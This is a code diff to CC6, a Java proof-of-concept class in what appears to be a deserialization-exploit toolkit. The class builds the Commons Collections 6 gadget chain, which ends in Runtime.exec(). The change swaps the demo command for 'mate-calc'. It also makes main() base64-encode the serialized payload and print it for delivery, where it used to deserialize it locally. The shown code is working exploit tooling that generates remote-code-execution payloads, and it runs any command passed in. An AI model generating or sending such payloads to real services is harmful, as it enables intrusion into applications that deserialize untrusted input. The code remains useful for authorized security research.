@@ -8,11 +8,13 @@ import org.apache.commons.collections.map.DefaultedMap;
 import org.apache.commons.collections.map.LazyMap;
 import xyz.eki.marshalexp.gadget.cc.GCC;
 import xyz.eki.marshalexp.sink.jdk.GTemplates;
+import xyz.eki.marshalexp.utils.MiscUtils;
 import xyz.eki.marshalexp.utils.ReflectUtils;
 import xyz.eki.marshalexp.utils.SerializeUtils;
 
 import javax.xml.transform.Templates;
 import java.lang.reflect.Field;
+import java.rmi.Remote;
 import java.util.HashMap;
 import java.util.HashSet;
 import java.util.Map;
@@ -32,7 +34,7 @@ import java.util.Map;
                                 java.lang.Runtime.exec()
     by @matthias_kaiser
 */
-public class CC6 implements POC{
+public class CC6 implements POC {
 
     public Object getPocObject(Transformer transformer) throws Exception{
         final Map innerMap = new HashMap();
@@ -73,8 +75,10 @@ public class CC6 implements POC{
 
 
     public static void main(String[] args) throws Exception {
-        String cmd= "open /System/Applications/Calculator.app";
+        String cmd= "mate-calc";
         Object poc = new CC6().getPocObject(cmd);
-        SerializeUtils.deserialize(SerializeUtils.serialize(poc));
+        byte[] serialize = SerializeUtils.serialize(poc);
+        String s = MiscUtils.base64Encode(serialize);
+        System.out.println(s);
     }
 }
